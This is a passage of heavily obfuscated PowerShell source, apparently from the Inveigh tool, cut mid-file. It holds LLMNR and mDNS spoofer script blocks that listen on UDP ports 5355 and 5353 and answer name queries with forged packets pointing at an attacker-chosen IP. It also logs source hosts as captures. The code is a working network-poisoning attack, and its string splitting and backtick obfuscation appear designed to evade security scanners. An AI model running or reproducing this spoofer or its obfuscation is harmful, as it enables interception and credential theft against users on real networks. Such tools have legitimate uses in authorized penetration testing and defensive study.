                                        ${LLMnr`_`SEND_s`ockeT}.("{1}{0}"-f'e','Clos').Invoke()
                                        ${LLM`NR_r`eSp`O`Nse_MEsSaGe} = ("{2}{4}{0}{3}{1}"-f'pons','t','- ','e sen','res')
                                    }
                                    else
                                    {
                                        ${Ll`Mn`R_RequEST`_iGno`Re} = ${TR`Ue}
                                    }
                                }
                                else
                                {

                                    if(${sp`OOfeR`HOs`TsREP`lY} -and ${sP`OO`F`e`RhoSTsREp`ly} -notcontains ${l`l`mNr_QUERy_S`TRIng})
                                    {
                                        ${LlMNR_`R`eSpON`Se_m`EssagE} = ('- '+"$LLMNR_query_string "+'is'+' '+'n'+'ot '+'o'+'n '+'repl'+'y '+'li'+'st')
                                    }
                                    elseif(${Spo`OfErh`Os`T`SIGNOre} -and ${sPoO`FE`Rh`OStS`iGnoRe} -contains ${L`L`MNR`_`QuerY`_sTrING})
                                    {
                                        ${LlMn`R_`R`eSPOnS`e_m`eSsaGE} = ('- '+"$LLMNR_query_string "+'i'+'s '+'on'+' '+'ign'+'o'+'re '+'l'+'ist')
                                    }
                                    elseif(${spO`oFE`RIPs`R`EPlY} -and ${sPO`O`FEr`IPsrE`pLY} -notcontains ${sOu`RCe_`IP})
                                    {
                                        ${L`LmNR_RES`pONs`E_`mESSaGe} = ('- '+"$source_IP "+'is'+' '+'n'+'ot '+'on'+' '+'re'+'ply'+' '+'l'+'ist')
                                    }
                                    elseif(${sP`oo`F`ERIp`Si`gNORE} -and ${sPOO`Fe`Rip`SIGNORe} -contains ${S`OUrC`E_Ip})
                                    {
                                        ${llmnr_`ReSponSE_me`s`sa`gE} = ('- '+"$source_IP "+'is'+' '+'on'+' '+'ig'+'nore'+' '+'li'+'st')
                                    }
                                    elseif(${INVe`IgH}."ValID`_hOst`_`l`iST" -contains ${Llmnr`_Q`UeRy`_StRing})
                                    {
                                        ${l`lMnR_RES`p`ONS`e_m`eSs`AGE} = ('- '+"$LLMNR_query_string "+'i'+'s '+'a '+'va'+'lid '+'h'+'ost')
                                    }
                                    elseif(${In`Vei`gh}."iP_Ca`PT`URE_LI`st" -contains ${sOUr`c`E_Ip}."ipad`dRessTO`STRI`NG")
                                    {
                                        ${LLmn`R_`R`ESPo`NS`E_M`ESSaGE} = ('- '+'p'+'reviou'+'s '+'captu'+'r'+'e '+'from'+' '+"$source_IP")
                                    }
                                    elseif(${S`pooF`ERLeARni`NG`DEl`Ay} -and ${S`POo`FER_LE`Arning_St`OPw`A`TCH}."e`lA`pSED" -lt ${SPoofer_lEA`RNiN`G_`d`eLaY})
                                    {
                                        ${LL`mnr_re`sP`OnsE_ME`sS`A`ge} = "- " + [Int](${Sp`Oof`erlea`RNIngD`Elay} - ${SP`OOFE`R_`leArN`I`Ng_sTop`W`Atch}."eLa`P`sed"."TOtal`MInU`TES") + ("{3}{0}{4}{2}{6}{1}{5}" -f'minute(s) un','ng sta','po',' ','til s','rts','ofi')
                                    }
                                    else
                                    {
                                        ${L`lmn`R_r`EsPo`NS`e_mesSA`gE} = ("{3}{2}{4}{0}{5}{1}"-f 'nt wr','ng','omething','- s',' we','o')
                                    }
                                
                                }
                            
                            }

                            if(!${L`L`m`NR_reQU`e`St_igNOre})
                            {
                                ${iNve`IGh}."c`oN`solE_`Qu`eUE".("{0}{1}"-f'Ad','d').Invoke(("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message "))

                                if(${iNV`E`IGH}."FiLe`_`OuTPut")
                                {
                                    ${Inv`eI`gh}."Lo`G_fI`lE_Q`UEUe".("{0}{1}" -f'A','dd').Invoke(("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message "))
                                }

                                if(${in`VeIgh}."L`OG_OUtP`UT")
                                {
                                    ${i`N`VEIGH}."L`Og".("{0}{1}"-f'Ad','d').Invoke(("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message "))
                                }

                            }

                        }

                    }

                }

                switch(${E`NdpoI`NT_souR`cE`_PorT})
                {

                    5355 
                    {
                    
                        if(${sp`oofErL`e`Ar`NINg} -eq 'Y' -and ${lLMn`R`_LEaRn`iN`G_l`oG}.("{1}{0}" -f'xists','E').Invoke({param(${S}) ${s} -like "* " +   ${5E`9a}::"T`o`StRing"(${pAYLOa`D_b`yt`es}[0..1]) + " *"}))
                        {
                            ${Ll`mNr_QU`eRY} =  ${5E`9a}::"t`o`sTriNg"(${P`AYLoa`D_b`yTes}[13..(${PAY`lOAd_BYt`eS}[12] + 13)])
                            ${llmnR`_Q`UErY} = ${lLmnr`_q`UeRY} -replace "-00",""

                            if(${lL`mNr_QuE`RY}."Leng`Th" -eq 2)
                            {
                                ${llmnR`_QUE`RY} = [Char]  (varIaBLE  ("v"+"wE") )."va`LUE"::("{2}{1}{0}" -f 'nt16','I','To').Invoke(${L`LmnR_qu`Ery},16)
                                ${LLMn`R`_qu`ErY`_`StrIng} = &("{1}{3}{0}{2}"-f'ec','New','t','-Obj') ("{0}{2}{3}{1}"-f'Syste','ing','m','.Str')(${lLMNr_`que`RY})
                            }
                            else
                            {
                                ${lL`MN`R_`QUERy} = ${lLMn`R_`qUE`RY}.("{0}{1}" -f'Sp','lit').Invoke("-") | &("{0}{3}{2}{1}" -f'ForEach-O','t','jec','b'){[Char]  (vARiAble  ("Vw"+"E"))."VAL`Ue"::("{1}{0}" -f '6','ToInt1').Invoke(${_},16)}
                                ${l`L`Mn`R_QuER`y_St`Ring} = &("{1}{2}{0}"-f't','New-Obje','c') ("{0}{1}{3}{2}"-f'Sys','te','.String','m')(${L`LM`NR_qu`ery},0,${llmnr`_`QuErY}."leN`Gth")
                            }
                            
                            [Byte[]]${LlmnR_`RE`S`pONSE_`IP_B`YTES} = ${P`Ay`Loa`D_bYTes}[(${PA`yLoad_B`yt`es}."leng`TH" - 4)..(${P`A`Y`LoA`d_BYTEs}."l`ENg`TH")]
                            ${lLm`NR_RE`s`PonSE_iP} = [System.Net.IPAddress]${lLMNr_`Re`sp`Ons`e_iP_`BYTEs}
                            ${ll`MNR_`RESPo`NS`E_IP} = ${lL`m`Nr_reS`poN`SE`_Ip}."IPAdDres`STosT`R`ing"
                            
                            if(${i`N`VeiGH}."Val`iD_`HoSt_Li`St" -notcontains ${lL`m`Nr_`QueRY`_STRiNG})
                            {
                                ${in`V`EIGh}."V`A`lI`d_hO`sT_liSt".("{1}{0}"-f'd','Ad').Invoke(${Llmnr_QU`ErY_`STRi`Ng})
                                ${iN`VEi`gH}."conSOle`_Que`Ue".("{1}{0}"-f'dd','A').Invoke(("$(Get-Date -format 's') - LLMNR response $LLMNR_response_IP for $LLMNR_query_string received from $source_IP - $LLMNR_query_string added to valid host list "))

                                if(${I`N`VEiGH}."f`ILE_oU`T`put")
                                {
                                    ${i`NvEI`gh}."LOG_`FiLe`_`QUe`Ue".("{1}{0}"-f 'dd','A').Invoke(("$(Get-Date -format 's') - LLMNR response $LLMNR_response_IP for $LLMNR_query_string received from $source_IP - $LLMNR_query_string added to valid host list "))
                                }

                                if(${invE`IGH}."log_`OUt`PUT")
                                {
                                    ${in`VE`Igh}."l`Og".("{1}{0}"-f 'd','Ad').Invoke(("$(Get-Date -format 's') - LLMNR response $LLMNR_response_IP for $LLMNR_query_string received from $source_IP - $LLMNR_query_string added to valid host list "))
                                }

                            }
                            
                        }

                    }

                }

            }

        }

    }

    ${B`Ina`RY`_rEAd`er}.("{1}{0}" -f'e','Clos').Invoke()
    ${MEm`or`Y`_StREAM}.("{1}{0}" -f 'e','Dispos').Invoke()
    ${mEMorY_`sTr`Eam}.("{0}{1}" -f'C','lose').Invoke()
}


${llMn`R`_SPo`ofEr_sc`R`ipTb`l`ock} = 
{
    param (${iN`sPeCT},${lLMN`R_R`esPO`N`Se_ME`SsaGe},${s`POoFeR`ip},${Sp`OofeR`h`OSTsRep`ly},${SP`Oof`ERhos`TSIGNoRE},${spo`OFErIpSr`EP`ly},${sPoOFeR`Ips`i`gnoRE},${lL`MNRt`Tl})

    ${LL`mn`R_R`UNNING} = ${Tr`UE}
    ${llmN`R_`Li`s`TenER`_ENdPOInT} = &("{1}{3}{0}{2}" -f '-obje','N','ct','ew') ("{6}{0}{3}{2}{5}{1}{4}" -f '.','nd','.IP','Net','Point','E','System') (  ${w`X9l}::"A`NY",5355)

    try
    {
        ${L`lMnR_UD`p_C`liEnt} = &("{2}{1}{3}{0}"-f't','-Obj','New','ec') ("{6}{2}{3}{4}{5}{1}{0}"-f 'UdpClient','ets.','st','em.Net','.Soc','k','Sy') 5355
    }
    catch
    {
        ${iNVE`IGH}."COnSO`L`E`_qUeUe".("{1}{0}"-f'dd','A').Invoke(("$(Get-Date -format 's') - Error starting LLMNR spoofer "))
        ${LlMNr_`Run`N`Ing} = ${f`ALse}

        if(${INvEi`GH}."fIlE_`oUtp`Ut")
        {
            ${I`N`VEigH}."LOg_fIl`E_Qu`eUE".("{1}{0}" -f'd','Ad').Invoke(("$(Get-Date -format 's') - Error starting LLMNR spoofer "))
        }

        if(${I`NV`eigH}."LOG`_O`UtPut")
        {
            ${Inv`eigH}."l`OG".("{0}{1}" -f'A','dd').Invoke(("$(Get-Date -format 's') - Error starting LLMNR spoofer "))
        }

    }

    ${llMnR_`mu`Lti`C`ASt_grOup} = [IPAddress]("{2}{0}{3}{1}"-f '.','.0.252','224','0')
    ${ll`m`NR_UDP`_`C`lienT}.("{3}{0}{1}{2}{4}"-f 'nMu','lticastG','r','Joi','oup').Invoke(${lL`m`Nr`_mulT`ICaST_`gr`OUP})
    ${l`LmNr_udp_C`L`i`eNT}."C`LIent"."re`CeivETI`M`EoUt" = 5000
    ${lL`mnR_`Ttl_`B`YTes} =  ( VArIAble  5E9A  -vaL)::("{1}{0}" -f'es','GetByt').Invoke(${L`lMNR`TTl})
      (  diR ("varIabL"+"e"+":YGaT1"+"e")  )."V`AluE"::("{0}{1}" -f'Reve','rse').Invoke(${LlM`N`R_tTl_`BYteS})

    while(${in`V`eIGh}."rUn`NInG" -and ${lL`m`N`R_RUnning})
    {   

        try
        {
            ${LL`MNR_r`eQUeS`T`_da`Ta} = ${LLm`NR_UDp`_C`l`ient}."rECeI`VE"([Ref]${lLmNR_lisTe`NER_`e`NdP`o`Int})
        }
        catch
        {
            ${LL`mnr_UDp_`CLIe`NT}.("{0}{1}" -f'Cl','ose').Invoke()
            ${lLMn`R_udp`_C`lIenT} = &("{0}{2}{3}{1}" -f 'new-O','ct','bj','e') ("{2}{5}{0}{4}{3}{1}"-f'Net.Socket','pClient','System','d','s.U','.') 5355
            ${L`LmN`R_`MU`Ltic`AsT_GR`oup} = [IPAddress]("{0}{1}{2}" -f'22','4.0.','0.252')
            ${l`Lmn`R_`U`Dp_cLieNt}.("{4}{3}{0}{1}{2}{5}" -f 'ca','stGr','ou','ti','JoinMul','p').Invoke(${lLmNr`_`MuL`TIc`AS`T_gR`Oup})
            ${Ll`MNR_u`D`p_C`Li`ENT}."cl`IENT"."rec`eiv`eTimeouT" = 5000
        }

        if(${lLMNR`_reQ`UEsT`_daTa} -and  (iTem ("VaRIA"+"Bl"+"E:"+"5e"+"9A"))."vAl`Ue"::"TOs`Tr`INg"(${l`l`m`NR_RE`QueS`T_DATa}[(${L`LMNR_`Reques`T_da`TA}."LeNg`Th" - 4)..(${LL`mn`R_ReQ`UEsT`_`DATa}."LE`Ngth" - 3)]) -ne ("{0}{1}" -f'00-','1c')) 
        {

            ${lLMn`R`_REsPonSE_PaC`k`Et} = ${llMNr_r`EQueSt_`d`ATA}[0,1] +
                                     0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +
                                     ${l`LmNR_`REQu`Est_da`Ta}[12..${LLmn`R_R`EQuEST_dA`TA}."len`gTH"] +
                                     ${L`LMNr_ReQU`e`sT_dAta}[12..${LL`m`N`R_reqUeST_dATA}."Le`NgTh"] +
                                     ${llm`Nr_tT`l`_`BYTes} +
                                     0x00,0x04 +
                                     ([System.Net.IPAddress][String]([System.Net.IPAddress]${Sp`o`ofeRiP})).("{1}{3}{0}{4}{2}"-f 'res','Ge','es','tAdd','sByt').Invoke()
        
            ${LLMNr`_qU`E`RY`_stri`NG} =   ( Get-chilDIteM  VAriaBLe:9sznjt )."VA`LUE"::"u`TF8"."Gets`TRI`NG"(${lLmn`R_Re`QuE`S`T`_DATa}[13..(${L`Lmnr_re`Q`UEST_dAta}[12] + 12)])     
            ${souRc`e`_`iP} = ${L`lMnr_LisTEn`eR`_eN`DpOINT}."add`R`eSS"."IPad`DR`e`SSTOStrI`Ng"

            if(!${i`NSPe`cT} -and (${Llm`N`R`_rEQu`EST_DATA} -and ${LLMN`R_lisTe`NEr_`e`NDP`Oint}."ad`drESS"."i`P`ADdR`esstoSTR`iNg" -ne ("{0}{1}"-f'0.0','.0.0')) -and (!${SPOof`ErhOs`T`SRep`LY} -or ${SPOoFE`R`ho`S`TSrEpLy} -contains ${Llm`N`R_q`U`Ery_sTring}) -and (
            !${SPOOFErh`OsTsI`G`NO`Re} -or ${sPooFe`RHO`STsi`gnoRe} -notcontains ${l`l`MNR_`q`Uery_stri`Ng}) -and (!${s`POo`FERiPs`RePly} -or ${spOOfERIp`SR`EPLy} -contains ${soU`R`CE`_Ip}) -and (!${SpoOF`erI`PsIGn`o`RE} -or ${s`pOofe`RIP`s`IGn`Ore} -notcontains ${sO`UR`Ce_ip}) -and (
            ${iN`VeI`Gh}."SPoOfer_RE`PE`AT" -or ${INVE`iGH}."I`p_CapTU`R`e_list" -notcontains ${sou`R`Ce_ip}))
            {
                ${LL`mnR_DE`stI`NAtION_eNDpo`i`NT} = &("{0}{1}{2}{3}" -f 'N','ew-','Obje','ct') ("{1}{3}{0}{2}" -f'Endpo','N','int','et.IP')(${lL`MnR`_`lIst`ene`R_`endpOInt}."AD`DR`Ess",${LlMnr`_`liSt`E`Ner_ENdPO`INt}."po`Rt")
                ${lLMNr_udP`_`CL`IeNT}.("{2}{1}{0}" -f'ct','nne','Co').Invoke(${LLmnR_dESTi`NAtIOn`_e`NDp`o`INt})
                ${LlMnr_U`D`p_`cLi`ENT}.("{1}{0}" -f'd','Sen').Invoke(${lLMnR`_`REsPON`s`e_paCK`Et},${L`L`mnR_r`eSpONSe_`PAc`K`et}."LE`NGTH")
                ${LLmnR_U`D`P_`cL`Ie`Nt}.("{0}{1}" -f 'Clos','e').Invoke()
                ${Llm`N`R_uDP_cL`iEnT} = &("{2}{3}{0}{1}" -f'jec','t','new-O','b') ("{3}{6}{4}{2}{5}{0}{1}"-f'ien','t','et.Sockets.Ud','S','tem.N','pCl','ys') 5355
                ${lL`m`NR_mulTi`CA`s`T_`gRoUp} = [IPAddress]("{2}{1}{0}" -f'.252','.0.0','224')
                ${ll`mNR_u`dP`_c`li`EnT}.("{0}{1}{3}{2}"-f 'JoinMulticas','t','roup','G').Invoke(${lL`Mn`R_MU`l`TicAST`_G`ROUP})
                ${LLM`Nr`_`UD`p_cliENt}."c`L`ieNt"."rEC`eI`VeT`imeOut" = 5000
                ${llMNr_REs`p`ON`se`_meS`Sa`gE} = ("{3}{2}{0}{1}" -f 'onse sen','t','p','- res')
            }
            else
            {

                if(${ins`PE`ct})
                {
                    ${Ll`MN`R_REspON`Se_MESS`AGe} = ("{4}{1}{3}{2}{0}" -f'y','spe','l','ct on','- in')
                }
                elseif(${S`P`OO`FErH`oSTsR`ePly} -and ${s`pO`ofe`RhoStS`RepLy} -notcontains ${l`LMN`R`_Q`Uery_`s`TriNg})
                {
                    ${LlM`N`R_`Re`Spon`SE_Mes`SaGe} = ('- '+"$LLMNR_query_string "+'is'+' '+'n'+'ot '+'o'+'n '+'re'+'ply '+'l'+'ist')
                }
                elseif(${spO`OfeRHos`T`Si`gNore} -and ${s`POoFERHoS`T`SiGNore} -contains ${Ll`MNR_Qu`eRY_`sTRiNg})
                {
                    ${LLmnr`_`RESPOn`sE_`m`eSsA`Ge} = ('- '+"$LLMNR_query_string "+'is'+' '+'o'+'n '+'i'+'g'+'nore '+'li'+'st')
                }
                elseif(${S`po`O`FeRI`p`SReplY} -and ${SP`O`of`Er`ipsRepLY} -notcontains ${sOur`cE`_iP})
                {
                    ${LLm`NR_RE`SPo`N`SE_m`es`sagE} = ('- '+"$source_IP "+'is'+' '+'no'+'t '+'on'+' '+'r'+'eply '+'lis'+'t')
                }
                elseif(${spooFe`RiPsI`GN`o`RE} -and ${SPooF`E`R`Ip`siG`NORE} -contains ${sOuR`c`E_iP})
                {
                    ${LL`Mn`R`_reSp`oNS`e_MEsSA`Ge} = ('- '+"$source_IP "+'i'+'s '+'o'+'n '+'ignore'+' '+'l'+'ist')
                }
                elseif(${Inv`e`igH}."IP_`cAPture`_l`ist" -contains ${s`ouRc`E_IP})
                {
                    ${l`lmnr`_RESp`onsE_m`eSSA`ge} = ('- '+'prev'+'iou'+'s '+'captu'+'re '+'fr'+'om '+"$source_IP")
                }
                else
                {
                    ${LL`M`NR_`ReS`PoNSe`_MESS`AGE} = ("{1}{0}{2}{3}"-f'g we','- somethin','nt wr','ong')
                }
                                
            }
        
            if(${LLmn`R_`ReqUeSt_`dA`Ta})                   
            {
                ${IN`Vei`gh}."cONSo`le_QU`eUE".("{0}{1}" -f'Ad','d').Invoke(("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message "))

                if(${i`NvEIGh}."fI`lE_O`Utp`UT")
                {
                    ${INV`E`igH}."lOG`_F`iLe_QueuE".("{0}{1}"-f 'Ad','d').Invoke(("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message "))
                }

                if(${IN`VEi`gh}."loG_oU`Tp`Ut")
                {
                    ${inveI`gH}."L`Og".("{0}{1}"-f'Ad','d').Invoke(("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message "))
                }

            }

            ${Ll`mN`R_reQuEs`T_dAtA} = ""
        }

    }

    ${L`Lmn`R_udp_`c`l`iEnT}.("{0}{1}"-f'Cl','ose').Invoke()
 }


${m`d`Ns`_S`PoofER_`scRiP`T`BlOcK} = 
{
    param (${inS`pect},${Md`NS_ReSPoNse`_`m`E`sS`Age},${mdN`S`Ttl},${mD`NSt`yP`ES},${SPOOFE`R`IP},${sPooF`Erho`stsreP`Ly},${S`POOfe`RhOS`TS`IGNOrE},${s`P`OOFeriPsR`EPLy},${s`POoFE`RIpSIg`NOre})

    ${Md`NS`_R`UN`NIng} = ${T`RUe}
    ${M`DN`s_L`IstenER_EN`DP`Oi`NT} = &("{1}{2}{0}" -f'object','N','ew-') ("{1}{3}{4}{2}{0}" -f 't','System.Net.','oin','IPEn','dP') (  ( gET-VARIabLe  wx9L )."vA`LUe"::"a`NY",5353)

    try
    {
        ${mdns`_UD`p_`clIEnT} = &("{0}{2}{3}{1}"-f 'Ne','t','w-Obje','c') ("{3}{2}{6}{0}{5}{4}{1}" -f'.Sockets','t','Ne','System.','lien','.UdpC','t') 5353
    }
    catch
    {
        ${i`NV`eiGh}."CO`Ns`olE_qUe`Ue".("{1}{0}"-f 'dd','A').Invoke(("$(Get-Date -format 's') - Error starting mDNS spoofer "))
        ${m`dn`s_rUNNing} = ${faL`se}

        if(${I`NVEIGh}."fi`l`e_O`UtPUt")
        {
            ${I`N`VEIgh}."lO`g`_FiLe_q`U`eUE".("{1}{0}"-f'd','Ad').Invoke(("$(Get-Date -format 's') - Error starting mDNS spoofer "))
        }

        if(${i`N`VeigH}."log`_OUTp`UT")
        {
            ${i`NVEiGH}."l`OG".("{0}{1}"-f 'A','dd').Invoke(("$(Get-Date -format 's') - Error starting mDNS spoofer "))
        }

    }

    ${mDNs_mu`L`TIC`ASt`_GRO`Up} = [IPAddress]("{1}{0}{2}" -f'2','224.0.0.','51')
    ${m`Dns_`Udp`_cLie`Nt}.("{3}{0}{1}{2}" -f'in','Multic','astGroup','Jo').Invoke(${mDn`S_`muLtiCaS`T_`GrOUp})
    ${MdNS_u`dp_`c`LIent}."c`lI`ENt"."rE`Ceivetim`EouT" = 5000
    ${Mdn`S_`T`Tl_`BytEs} =   ${5`E9a}::("{1}{0}"-f's','GetByte').Invoke(${mD`Ns`TTL})
     ${y`g`AT1e}::("{0}{2}{1}"-f 'R','rse','eve').Invoke(${m`Dn`s_`TTL_byT`es})

    while(${In`VE`igH}."r`UnnInG" -and ${M`dns_rU`N`Ning})
    {   

        try
        {
            ${MDns_r`eQU`e`s`T_data} = ${MDnS_`UdP_`c`lI`enT}."RE`ce`iVE"([Ref]${MDNs`_LI`StENeR_END`poINT})
        }
        catch
        {
            ${m`Dns_`UD`P_`cLieNt}.("{1}{0}" -f'ose','Cl').Invoke()
            ${MDN`S_udP`_c`Lie`Nt} = &("{1}{2}{0}"-f 'ct','new-Ob','je') ("{5}{1}{0}{3}{2}{4}" -f 'c','tem.Net.So','dpCl','kets.U','ient','Sys') 5353
            ${mDNs_muLti`C`AS`T`_G`R`OUp} = [IPAddress]("{2}{1}{0}{3}"-f'.0.25','.0','224','1')
            ${MDN`S_u`d`p_clIENT}.("{3}{2}{0}{4}{1}" -f 'r','up','nMulticastG','Joi','o').Invoke(${MdNs`_Mul`TI`CaSt_g`ROUp})
            ${MDn`s_u`dp_cL`iEnT}."c`LIEnT"."RecE`iv`eTIMe`oUT" = 5000
        }
        
        if(  (GeT-varIaBLE 5E9a -VaLU )::("{0}{1}{2}" -f'To','S','tring').Invoke(${Mdns_R`equ`EST_Da`Ta}) -like ("{3}{2}{1}{0}" -f'-01','00-01-80','-','*'))
        {
            ${mD`Ns_resPo`N`se_paCkeT} = ${Md`NS_Re`Qu`ESt_Da`TA}[0,1] +
                                    0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
                                    ${MDns`_ReqU`Es`T_dA`TA}[12..(${M`D`NS_R`eQu`eSt_da`TA}."LENG`Th" - 5)] +
                                    0x00,0x01,0x00,0x01 +
                                    ${MDNs_T`TL_B`y`T`ES} +
                                    0x00,0x04 +
                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]${SP`OoF`E`RiP})).("{3}{0}{1}{2}" -f 'tAddre','ssByt','es','Ge').Invoke()
                        
            ${m`d`Ns_`qUErY`_sTrINg} = &("{3}{0}{1}{2}" -f 'taToSt','ri','ng','Da') 13 ${mdNS_rEq`Ue`St`_DaTa}[12] ${md`NS`_r`e`Quest_DAtA}
            ${MdnS_`qUERY`_`StrINg_F`U`LL} = ${M`D`Ns`_QUERY_stRInG} + ("{2}{0}{1}" -f'oc','al','.l')   
            ${SoU`RC`e_ip} = ${mD`Ns_lI`Sten`er_En`DpO`i`Nt}."AD`d`REss"."ipADdres`stO`STRI`Ng"

            if(!${IN`SPe`CT} -and (${Mdns`_R`EQ`UEsT_dATa} -and ${m`D`N`S_LIS`TeNE`R_EN`dpOiNt}."a`DDr`ess"."iPAddrEsSt`o`S`TriNg" -ne ("{0}{1}" -f'0.0','.0.0')) -and (!${SpooF`erh`ostS`Re`plY} -or ${SP`oOfErH`osTsr`Ep`Ly} -contains ${M`DNS_qUErY`_stR`iNg}) -and (
            !${SPoo`FERhost`S`I`gN`orE} -or ${S`Po`OFER`hOStSig`N`Ore} -notcontains ${MDN`s`_q`U`e`Ry_StRING}) -and (!${sPo`o`FeRiPsr`EPLY} -or ${spO`OF`E`Ri`PSrEpLy} -contains ${SOur`CE_`ip}) -and (!${S`POoFER`i`PSi`GNORe} -or ${s`p`OoFE`RIpSiGNORe} -notcontains ${sO`UrcE`_iP}) -and (
            ${M`dnstYp`eS} -contains 'QU') -and (${i`N`VEIGH}."spOO`FER`_`RE`PEaT" -or ${Inv`e`iGH}."I`P_Ca`pTUR`E_l`iSt" -notcontains ${soU`Rce`_ip}))
            {
                ${MdnS_De`StiNaTIOn_`En`DPOi`Nt} = &("{0}{2}{3}{1}"-f 'New-','ct','Obj','e') ("{2}{1}{0}{3}" -f 'poi','End','Net.IP','nt')(${mdNS_l`I`s`Te`NeR_e`NdpOI`Nt}."aD`dReSs",${mDn`s_`liSTen`eR_enD`poInt}."P`oRT")
                ${M`DN`s`_`UdP_cLiENT}.("{1}{0}{2}" -f 'onn','C','ect').Invoke(${m`dNS`_Dest`In`At`io`N_`ENDPoInt})
                ${MDn`s_U`dp_Cl`I`Ent}.("{1}{0}" -f'd','Sen').Invoke(${mD`N`S_`RE`sPon`sE_PaCKEt},${mDN`s_`ReSpoN`SE_pACKet}."l`EnGth")
                ${MDnS`_UdP_`cli`e`Nt}.("{0}{1}"-f'Clos','e').Invoke()
                ${M`d`Ns_u`dp_`cL`IENt} = &("{1}{0}{3}{2}" -f 'w','ne','ject','-Ob') ("{1}{0}{4}{3}{2}" -f 'et.','System.N','Client','dp','Sockets.U') 5353
                ${MD`Ns_MULTic`AST_G`R`OUP} = [IPAddress]("{1}{2}{0}" -f'0.251','224','.0.')
                ${m`dns`_u`D`p_ClIeNt}.("{2}{5}{0}{3}{1}{4}"-f 'lt','o','Jo','icastGr','up','inMu').Invoke(${mDnS_M`UL`TIcaS`T_`GrouP})
                ${m`dNs_udP`_`cLI`EnT}."cliE`NT"."rec`eI`VEti`meOUt" = 5000
                ${MdNs_RES`pOns`E_M`es`sAGE} = ("{2}{0}{3}{1}{4}"-f ' respons','sen','-','e ','t')
            }
            else
            {

                if(${in`SpeCt})
                {
                    ${M`d`Ns_rES`pOnsE_`meSsaGE} = ("{0}{1}{2}{3}" -f '-',' ins','pect',' only')
                }
                elseif(${mD`Nst`YpES} -notcontains 'QU')
                {
                    ${MDNS_`RespoN`se_mess`AGE} = ("{0}{4}{2}{1}{3}{5}" -f'- dis','mDN','ed ','S','abl',' type')
                }
                elseif(${sp`oOFER`Ho`StsR`EPly} -and ${sP`o`Of`erhO`sTsRePLy} -notcontains ${M`dN`s_`QuErY_StRING})
                {
                    ${M`DNS_re`s`P`ON`SE_mEssAge} = ('- '+"$mDNS_query_string "+'i'+'s '+'n'+'ot '+'on'+' '+'r'+'ep'+'ly '+'lis'+'t')
                }
                elseif(${S`pOOf`E`RHosTs`iGN`ORe} -and ${spOofer`host`Si`gnORE} -contains ${mDnS`_QUERY_`sT`R`inG})
                {
                    ${MDN`S_R`esPonSE`_`Me`SSagE} = ('- '+"$mDNS_query_string "+'is'+' '+'on'+' '+'ignor'+'e'+' '+'li'+'st')
                }
                elseif(${spo`Of`erip`sreplY} -and ${s`poO`FERIP`S`R`ePLY} -notcontains ${SOuRcE`_`IP})
                {
                    ${m`dnS_ReSpoN`Se_Me`Ss`A`Ge} = ('- '+"$source_IP "+'i'+'s '+'not'+' '+'on'+' '+'r'+'eply'+' '+'l'+'ist')
                }
                elseif(${sPoOf`e`RIpSI`Gn`orE} -and ${SPo`O`FER`ipsIGNOre} -contains ${so`U`RCe_iP})
                {
                    ${mDnS_`ResP`oN`se`_`mE`ssAge} = ('- '+"$source_IP "+'i'+'s '+'on'+' '+'igno'+'re '+'lis'+'t')
                }
                elseif(${i`NV`eIgH}."IP_`CaPtu`R`E_lI`ST" -contains ${SoU`RC`e_`IP})
                {
                    ${m`dNs_rEs`poNSe_`m`e`sSA`Ge} = ('- '+'prev'+'io'+'us '+'captur'+'e'+' '+'f'+'rom '+"$source_IP")
                }
                else
                {
                    ${M`D`Ns_rE`sPoNsE`_mEssAGE} = ("{1}{2}{0}{4}{3}" -f 't ','- something we','n','g','wron')
                }
                                
            }
        
            if(${MdN`S`_reQUesT_d`A`Ta})                   
            {
                ${IN`VeiGH}."COnso`Le`_`QUEue".("{0}{1}"-f 'A','dd').Invoke(("$(Get-Date -format 's') - mDNS(QU) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message "))

                if(${INVe`igH}."fI`le_`OUt`puT")
                {
                    ${inV`EIgh}."loG_`F`IL`e_q`UeUe".("{0}{1}" -f 'A','dd').Invoke(("$(Get-Date -format 's') - mDNS(QU) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message "))
                }

                if(${INVe`i`GH}."Lo`g`_OU`Tput")
                {
                    ${INV`e`Igh}."L`Og".("{1}{0}" -f 'dd','A').Invoke(("$(Get-Date -format 's') - mDNS(QU) request for $mDNS_query_string_full received from $source_IP $mDNS_response_message "))
                }

            }

            ${mdnS_R`EQ`UEs`T`_data} = ""
        }
        elseif( (  get-vaRIable 5E9a  )."VAL`UE"::("{0}{2}{1}" -f'ToStr','ng','i').Invoke(${M`D`Ns_`REQUeS`T_datA}) -like ("{1}{4}{6}{5}{3}{2}{7}{0}" -f'00-01-*','*-05-6','01','6C-00-00-','C-6F','3-61-','-6','-'))
        {
            ${m`D`N`S_r`espO`NSE_Pa`ckEt} = ${M`DNs_RequeS`T_`dAtA}[0,1] +
                                    0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
                                    ${md`Ns_ReQu`E`st_d`AtA}[12..(${MDNS_rEQ`U`esT_D`A`Ta}[12] + 12)] +
                                    0x05,0x6c,0x6f,0x63,0x61,0x6c,0x00 +
                                    0x00,0x01,0x00,0x01 +
                                    ${m`dNs_`TTL_B`YteS} +
                                    0x00,0x04 +
                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]${sP`ooFE`R`Ip})).("{1}{2}{0}" -f 'Bytes','GetAd','dress').Invoke()
                        
            ${M`DNS_`QuERY`_STRi`Ng} = &("{3}{1}{2}{0}"-f'g','a','ToStrin','Dat') 13 ${mdNS_r`Equ`E`St_dA`TA}[12] ${mdN`S_ReQ`UEST`_da`TA}
            ${M`DNS_`q`Ue`RY_sTrING_`FULl} = ${mdNS`_QueRy_`sT`RINg} + ("{0}{1}"-f '.','local')   
